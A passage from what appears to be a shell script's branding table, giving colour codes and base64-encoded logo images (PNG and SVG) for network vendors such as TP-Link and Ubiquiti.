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'
										["TP-Link"]='#3F3F3F #54E8E4 #B3B3B3 data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA0MjAgMTYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgoJPHBhdGggZD0ibTAgMTExLjM2YzAgNC4xNTk5IDMuNDc1OSA4LjMxOTggOC4yMTU4IDguMzE5OGgzMS42MTV2MzIuMDAzYzAgNC4xNTk5IDMuNDc1OSA4LjMxOTggOC4yMTU4IDguMzE5OGgyNy4wMzF2LTc2LjAwMmgtNzUuMDc4em0xMDAuMjEtMTExLjM2Yy0zMy4wMzUgMC01OS40MjcgMjYuNTU5LTU5LjQyNyA1OS4zNTV2MTIuNjQ0aDMzLjE4N3YtMTIuNjQ0YzAtMTQuMjM2IDExLjU0LTI1Ljc1NSAyNi4yMzktMjUuNzU1IDE0LjU0IDAgMjQuNjU5IDEwLjIzNiAyNC42NTkgMjUuNDM1IDAgMTUuMDQ0LTEwLjkwOCAyNi4wODMtMjUuNDU1IDI2LjA4M2gtMTIuNDg0djMzLjU5MWgxMi40ODRjMzIuNDExIDAgNTguNjUxLTI2LjcxMSA1OC42NTEtNTkuNjc5IDAtMzQuMjMxLTI0LjQ5OS01OS4wMzEtNTcuODU1LTU5LjAzMSIgZmlsbD0iIzRhY2JkNiIvPgoJPHBhdGggZD0ibTQyMCAxMTkuNjgtMjAuNzExLTIzLjY3NSAxOC40OTYtMjEuMjgzaC0xMS41NDhsLTE2LjU4OCAxOS44NHYtNDAuMTUxbC05LjgwMzggNC45NTU5djU3Ljc1OWMwIDEuNDM2IDEuMTA0IDIuNTU5OSAyLjM3MTkgMi41NTk5aDcuNDMxOHYtMjIuMzk5bDE4LjMzMiAyMi4zOTloMTIuMDJ6bS03MC44MTgtNDYuMjQzYy03LjkwNzggMC0xNi4xMjggNC4xNjc5LTIwLjIzNiAxMC4yNDR2MzMuNTk5YzAgMS4yNzYgMS4xMTIgMi40IDIuMzcxOSAyLjRoNy40MzE4di0zMS45OTljMi4zNjM5LTMuMDM1OSA2LjE2MzgtNC45NTU5IDEwLjQzMi00Ljk1NTkgNi43OTU4IDAgMTEuNjkyIDUuNDM1OSAxMS42OTIgMTIuNjM2djI0LjMxOWg5LjY0Mzh2LTI0LjYzOWM0ZS0zIC0xMi4zMTYtOS4xNjc4LTIxLjYwMy0yMS4zMzUtMjEuNjAzbS0zNS4wOTEtMTkuOTkyYy0zLjYzMTkgMC02LjYzOTggMi44ODM5LTYuNjM5OCA2LjU1OTggMCAxLjc2IDAuNjI3OTkgMy4xOTU5IDEuNzM2IDQuMzE5OWg5LjgwMzhjMS4xMDQtMS4xMjQgMS43MzYtMi41NTk5IDEuNzM2LTQuMzE5OSA0ZS0zIC0zLjY3OTktMi45OTk5LTYuNTU5OC02LjYzNTgtNi41NTk4bTQuOTAzOSA2Ni4yMzR2LTQ0Ljk1OWgtOS44MDM4djQyLjU1OWMwIDEuMjc2IDEuMTEyIDIuNCAyLjM3MTkgMi40em0tMjkuNTYzLTIuNGMwIDEuMjc2IDEuMTEyIDIuNCAyLjM3MiAyLjRoNy40MzE4di02NS4yN2wtOS44MDM4IDQuOTU1OXptLTIxLjk3MS0xNS4xOTZoMTMuMjh2LTkuOTIzN2gtMTguMDI0em0tMzQuNjE1LTI4LjE1OWMtOC4zNzU4IDAtMTcuMjI4IDQuNDc5OS0yMS42NTUgMTEuMDR2NDkuMjcxYzAgMS4yODQgMS4xMDQgMi40IDIuMzcxOSAyLjRoNy40MjM4di00Ny42NzFjMi4zNzE5LTMuNTIzOSA2Ljc5OTgtNS43NjM5IDExLjctNS43NjM5IDcuNTgzOCAwIDEzLjEyIDUuNzYzOSAxMy4xMiAxMy45MiAwIDguMDAzOC01LjUzNTkgMTQuMDg0LTEzLjEyIDE0LjA4NGgtNi45NTU4djguNDc5OGg3LjExNThjMTMuMTIgMCAyMi43NTktOS40Mzk4IDIyLjc1OS0yMi41NTktNGUtMyAtMTMuMjg0LTkuNzk5OC0yMy4xOTktMjIuNzU5LTIzLjE5OW0tNDMuOTQzIDMwLjcxMXYtMjEuMTE1aDEyLjY0NHYtOC43OTk4aC0xMi42NDR2LTEzLjU5MmwtOS44MDM4IDQuOTU1OXY0MC42NDNjMCA4LjMxNTggNC44OTk5IDEyLjk2IDEzLjU5NiAxMi45NmgxMi42NDR2LTguNDc5OGgtMTAuMTEyYy00Ljc0NzktNGUtMyAtNi4zMjM4LTEuNzcyLTYuMzIzOC02LjU3MTgiLz4KPC9zdmc+Cg=='
										["Ubiquiti"]='#1D1F2E #006FFF #E0E0E0 data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjxzdmcKICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIgogICB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiCiAgIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCiAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKICAgdmlld0JveD0iMCAwIDE2NC4xMDI2OCAxMzguNDYxMzMiCiAgIGhlaWdodD0iMTM4LjQ2MTMzIgogICB3aWR0aD0iMTY0LjEwMjY4IgogICB4bWw6c3BhY2U9InByZXNlcnZlIgogICBpZD0ic3ZnMiIKICAgdmVyc2lvbj0iMS4xIj48bWV0YWRhdGEKICAgICBpZD0ibWV0YWRhdGE4Ij48cmRmOlJERj48Y2M6V29yawogICAgICAgICByZGY6YWJvdXQ9IiI+PGRjOmZvcm1hdD5pbWFnZS9zdmcreG1sPC9kYzpmb3JtYXQ+PGRjOnR5cGUKICAgICAgICAgICByZGY6cmVzb3VyY2U9Imh0dHA6Ly9wdXJsLm9yZy9kYy9kY21pdHlwZS9TdGlsbEltYWdlIiAvPjwvY2M6V29yaz48L3JkZjpSREY+PC9tZXRhZGF0YT48ZGVmcwogICAgIGlkPSJkZWZzNiI+PGNsaXBQYXRoCiAgICAgICBpZD0iY2xpcFBhdGgxOCIKICAgICAgIGNsaXBQYXRoVW5pdHM9InVzZXJTcGFjZU9uVXNlIj48cGF0aAogICAgICAgICBpZD0icGF0aDE2IgogICAgICAgICBkPSJtIDYuOTk4LDcuMzkyIGggMTA5LjA4IFYgOTYuNDU1IEggNi45OTggWiIgLz48L2NsaXBQYXRoPjxjbGlwUGF0aAogICAgICAgaWQ9ImNsaXBQYXRoNDQiCiAgICAgICBjbGlwUGF0aFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHBhdGgKICAgICAgICAgaWQ9InBhdGg0MiIKICAgICAgICAgZD0ibSA2MS43MjMsNTIuODA4IGMgLTMuNDU2LDAuMTU3IC02LjExNSwxLjAzNCAtOC4xNzUsMi4zMDMgdiAwIGMgMS4zOTUsLTYuMDU1IDYuNjEyLC05LjAyOSA2Ljg2NCwtOS4xNyB2IDAgbCAxLjUzOCwtMC44NDggYyAxMS43NjgsMC43ODYgMTguNjU2LDguMzgzIDE4LjY1NiwxOC4zMTcgdiAwIDIuMTUzIEMgNzcuODA5LDU2LjQzNyA3MS4yOTksNTIuMzc3IDYxLjcyMyw1Mi44MDgiIC8+PC9jbGlwUGF0aD48bGluZWFyR3JhZGllbnQKICAgICAgIGlkPSJsaW5lYXJHcmFkaWVudDU0IgogICAgICAgc3ByZWFkTWV0aG9kPSJwYWQiCiAgICAgICBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDI3LjA1NzAwNywwLDAsMjcuMDU3MDA3LDUzLjU0ODQ5Miw1NS4zMjgwNjQpIgogICAgICAgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiCiAgICAgICB5Mj0iMCIKICAgICAgIHgyPSIxIgogICAgICAgeTE9IjAiCiAgICAgICB4MT0iMCI+PHN0b3AKICAgICAgICAgaWQ9InN0b3A1MCIKICAgICAgICAgb2Zmc2V0PSIwIgogICAgICAgICBzdHlsZT0ic3RvcC1vcGFjaXR5OjE7c3RvcC1jb2xvcjojNjU2MjYzIiAvPjxzdG9wCiAgICAgICAgIGlkPSJzdG9wNTIiCiAgICAgICAgIG9mZnNldD0iMSIKICAgICAgICAgc3R5bGU9InN0b3Atb3BhY2l0eToxO3N0b3AtY29sb3I6I2E3YTVhNiIgLz48L2xpbmVhckdyYWRpZW50PjxjbGlwUGF0aAogICAgICAgaWQ9ImNsaXBQYXRoNjYiCiAgICAgICBjbGlwUGF0aFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHBhdGgKICAgICAgICAgaWQ9InBhdGg2NCIKICAgICAgICAgZD0ibSA2Ljk5OCw3LjM5MiBoIDEwOS4wOCBWIDk2LjQ1NSBIIDYuOTk4IFoiIC8+PC9jbGlwUGF0aD48L2RlZnM+PGcKICAgICB0cmFuc2Zvcm09Im1hdHJpeCgxLjMzMzMzMzMsMCwwLC0xLjMzMzMzMzMsMCwxMzguNDYxMzMpIgogICAgIGlkPSJnMTAiPjxnCiAgICAgICBpZD0iZzEyIj48ZwogICAgICAgICBjbGlwLXBhdGg9InVybCgjY2xpcFBhdGgxOCkiCiAgICAgICAgIGlkPSJnMTQiPjxnCiAgICAgICAgICAgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoNzkuNjAyMSw2NS44NzA2KSIKICAgICAgICAgICBpZD0iZzIwIj48cGF0aAogICAgICAgICAgICAgaWQ9InBhdGgyMiIKICAgICAgICAgICAgIHN0eWxlPSJmaWxsOiMwZDBkMGQ7ZmlsbC1vcGFjaXR5OjE7ZmlsbC1ydWxlOm5vbnplcm87c3Ryb2tlOm5vbmUiCiAgICAgICAgICAgICBkPSJtIDAsMCAxLjAwNCwzLjI3NSB2IDIyLjQzNyBjIC0xMS43MzQsMCAtMTIuOTU2LC00LjQ5OSAtMTIuOTU2LC04Ljc5NiB2IC0yNC42NCBjIDAsLTEuMjc2IC0wLjEyNCwtMi42MjkgLTAuMzgyLC0zLjk1NiBDIC02LjExMiwtMTAuNTQ3IC0yLjA1MywtNi43MDEgMCwwIiAvPjwvZz48cGF0aAogICAgICAgICAgIGlkPSJwYXRoMjQiCiAgICAgICAgICAgc3R5bGU9ImZpbGw6IzM5YTJlMTtmaWxsLW9wYWNpdHk6MTtmaWxsLXJ1bGU6bm9uemVybztzdHJva2U6bm9uZSIKICAgICAgICAgICBkPSJtIDQ5LjU2Niw4Ni40NiBoIC0yLjU5MyB2IDIuNTYx